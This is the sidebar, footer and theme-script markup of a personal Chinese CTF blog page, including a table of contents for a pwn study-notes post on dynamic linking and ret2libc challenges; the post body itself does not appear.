onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">g01den</div><div class="author-info__description">golden的部落阁</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04"><span class="toc-number">1.</span> <span class="toc-text"> pwn 学习笔记（4）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 静态链接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text"> 动态链接：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%AE%80%E8%BF%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1. 简述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2. 过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B0%83%E7%94%A8%E4%BB%A5printf%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 第一次调用（以 printf () 举例）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 第二次调用：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%85%E8%B0%88%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%AD%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="toc-number">1.3.</span> <span class="toc-text"> 浅谈函数调用中的参数传递：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.4.</span> <span class="toc-text"> ret2libc：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%83%85%E5%86%B51"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 1. 情况 1：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8Bctf-wikiret2libc1"><span class="toc-number">1.4.1.1.</span> <span class="toc-text"> 题目案例：CTF-Wiki–ret2libc1：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%83%85%E5%86%B52"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 2. 情况 2：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8Bctf-wikiret2libc2"><span class="toc-number">1.4.2.1.</span> <span class="toc-text"> 题目案例：CTF-Wiki–ret2libc2：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%83%85%E5%86%B53"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 3. 情况 3：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8B2021-%E9%B9%A4%E5%9F%8E%E6%9D%AFbabyof"><span class="toc-number">1.4.3.1.</span> <span class="toc-text"> 题目案例：[2021 鹤城杯] babyof：</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/2d792864.html" title="Python栈帧逃逸"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2025/09/13/hLAZVGrtXDvxJIN.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python栈帧逃逸"/></a><div class="content"><a class="title" href="/posts/2d792864.html" title="Python栈帧逃逸">Python栈帧逃逸</a><time datetime="2025-09-13T14:05:07.000Z" title="发表于 2025-09-13 22:05:07">2025-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4826d2ce.html" title="ctfshow-SSTI"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2025/05/03/WC6qReAr3aKo287.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-SSTI"/></a><div class="content"><a class="title" href="/posts/4826d2ce.html" title="ctfshow-SSTI">ctfshow-SSTI</a><time datetime="2025-05-03T15:19:26.000Z" title="发表于 2025-05-03 23:19:26">2025-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2025/03/26/xrS4V3bGRAsozXj.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从NSSCTF开始的复建之路"/></a><div class="content"><a class="title" href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路">从NSSCTF开始的复建之路</a><time datetime="2025-03-26T14:52:27.000Z" title="发表于 2025-03-26 22:52:27">2025-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/de34fe7b.html" title="【2024】HECTF-个人整理向"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/12/09/DfPey5as3WvUC6n.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【2024】HECTF-个人整理向"/></a><div class="content"><a class="title" href="/posts/de34fe7b.html" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a><time datetime="2024-12-09T12:59:36.000Z" title="发表于 2024-12-09 20:59:36">2024-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ad175165.html" title="ctfshow-文件包含"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/12/09/UxuP4fcVCgLi5IH.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-文件包含"/></a><div class="content"><a class="title" href="/posts/ad175165.html" title="ctfshow-文件包含">ctfshow-文件包含</a><time datetime="2024-11-24T13:38:01.000Z" title="发表于 2024-11-24 21:38:01">2024-11-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By g01den</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="12208257400" data-server="netease" data-type="playlist"   data-order="list" data-fixed="true" data-preload="auto" data-autoplay="false" data-mutex="true" ></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
